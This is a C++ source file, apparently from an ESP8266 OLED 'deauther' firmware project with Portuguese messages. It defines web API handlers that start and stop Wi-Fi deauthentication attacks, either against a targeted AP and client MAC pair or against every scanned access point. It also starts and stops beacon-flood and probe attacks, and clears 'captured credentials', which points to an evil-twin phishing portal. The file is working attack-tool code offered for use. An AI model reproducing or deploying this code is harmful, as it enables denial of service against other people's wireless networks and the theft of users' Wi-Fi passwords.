ecsistem/oled-esp8266/src/wifi_portal.cpp
  void handleClearCapturedCredentials()
  {
    bool ok = clearCapturedCredentials();

    if (!ok)
    {
      server.send(500, "text/plain; charset=utf-8", "Falha ao limpar credenciais");
      return;
    }

    server.sendHeader("Location", "/admin", true);
    server.send(303, "text/plain", "");
  }

  String buildWifiSelectOptions()
  {
    String options;
    int networkCount = WiFi.scanNetworks();

    if (networkCount <= 0)
    {
      options += "<option value=''>Nenhuma rede encontrada</option>";
      return options;
    }

    for (int i = 0; i < networkCount; i++)
    {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0)
      {
        continue;
      }

      int rssi = WiFi.RSSI(i);
      String selected = ssid == wifiSsid ? " selected" : "";
      options += "<option value='" + escapeHtml(ssid) + "'" + selected + ">";
      options += escapeHtml(ssid) + " (" + String(rssi) + " dBm)";
      options += "</option>";
    }

    WiFi.scanDelete();
    return options;
  }

  constexpr size_t kLabPayloadMax = 512;

  bool decodeHexPayload(const String &hex, uint8_t *out, size_t outCap, size_t &written)
  {
    written = 0;
    String compact;
    compact.reserve(hex.length());

    for (unsigned i = 0; i < hex.length(); i++)
    {
      char c = hex[i];
      if (c == ' ' || c == '\t' || c == '\n' || c == '\r')
      {
        continue;
      }
      if (!isxdigit(static_cast<unsigned char>(c)))
      {
        return false;
      }
      compact += c;
    }

    if ((compact.length() % 2U) != 0 || compact.length() == 0)
    {
      return false;
    }

    written = compact.length() / 2;
    if (written > outCap)
    {
      return false;
    }

    auto nibble = [](char c) -> int
    {
      if (c >= '0' && c <= '9')
        return c - '0';
      if (c >= 'a' && c <= 'f')
        return 10 + c - 'a';
      if (c >= 'A' && c <= 'F')
        return 10 + c - 'A';
      return -1;
    };

    for (size_t i = 0; i < written; i++)
    {
      int hi = nibble(compact[i * 2]);
      int lo = nibble(compact[i * 2 + 1]);
      if (hi < 0 || lo < 0)
      {
        return false;
      }
      out[i] = static_cast<uint8_t>((hi << 4) | lo);
    }

    return true;
  }

  bool isSafeHttpPath(const String &p)
  {
    if (p.length() == 0 || p[0] != '/')
    {
      return false;
    }
    if (p.indexOf("..") >= 0)
    {
      return false;
    }
    for (unsigned i = 0; i < p.length(); i++)
    {
      char c = p[i];
      if (c == '<' || c == '>' || c == '"' || c == '\\')
      {
        return false;
      }
    }
    return true;
  }

  int countScanApsWithBssid()
  {
    int n = 0;
    for (int i = 0; i < g_wifiScanNetworkCount; i++)
    {
      bool nz = false;
      for (int j = 0; j < 6; j++)
      {
        if (g_wifiScanNetworks[i].bssid[j] != 0)
        {
          nz = true;
          break;
        }
      }
      if (nz)
      {
        n++;
      }
    }
    return n;
  }

  void handleApiDeauthStart()
  {
    const String allRaw = server.arg("deauth_all");
    const bool wantAll = (allRaw == "1" || allRaw.equalsIgnoreCase("true"));

    if (wantAll)
    {
      const int n = countScanApsWithBssid();
      if (n <= 0)
      {
        server.send(400, "application/json; charset=utf-8",
                     "{\"error\":\"Nenhum AP com BSSID no ultimo scan. Escaneie no ecra 5 ou use GET /api/scan e repita.\"}");
        return;
      }
      deautherDeauthAll = true;
      saveWiFiConfig();
      toggleDeauther();
      if (!deautherRunning)
      {
        server.send(500, "application/json; charset=utf-8",
                     "{\"error\":\"Falha ao iniciar deauth em todos os AP (verifique o scan).\"}");
        return;
      }
      JsonDocument doc;
      doc["success"] = true;
      doc["message"] = "Deauth (todos os AP do ultimo scan) iniciado";
      doc["ap_count"] = n;
      doc["note"] = "SoftAP mantido (WIFI_AP_STA). Pare com /api/deauth/stop ou o botao no ecra.";
      String payload;
      serializeJson(doc, payload);
      server.send(200, "application/json; charset=utf-8", payload);
      return;
    }

    deautherDeauthAll = false;
    saveWiFiConfig();

    String apMac = server.arg("ap_mac");
    String clientMac = server.arg("client_mac");
    int channel = parseIntBounded(server.arg("channel"), 1, 14, 1);

    if (apMac.length() == 0 || clientMac.length() == 0)
    {
      server.send(400, "application/json; charset=utf-8", "{\"error\":\"ap_mac e client_mac obrigatorios (ou deauth_all=1)\"}");
      return;
    }

    deautherApMac = apMac;
    deautherClientMac = clientMac;
    deautherChannel = channel;
    saveWiFiConfig();

    toggleDeauther();

    JsonDocument doc;
    doc["success"] = true;
    doc["message"] = deautherRunning ? "Deauth no alvo iniciado" : "Deauth nao iniciado (MAC invalido?)";
    doc["note"] = "SoftAP mantido durante injecao. Pare com /api/deauth/stop.";
    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleApiDeauthStop()
  {
    toggleDeauther();

    JsonDocument doc;
    doc["success"] = true;
    doc["message"] = "Deauther stopped";
    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleApiBeaconStart()
  {
    startBeaconAttack();

    JsonDocument doc;
    doc["success"] = true;
    doc["message"] = "Beacon attack started";
    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleApiBeaconStop()
  {
    stopBeaconAttack();

    JsonDocument doc;
    doc["success"] = true;
    doc["message"] = "Beacon attack stopped";
    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleApiProbeStart()
  {
    startProbeAttack();
    JsonDocument doc;
    doc["success"] = true;
    doc["message"] = "Probe attack started";
    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleApiProbeStop()
  {
    stopProbeAttack();
    JsonDocument doc;
    doc["success"] = true;
    doc["message"] = "Probe attack stopped";
    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

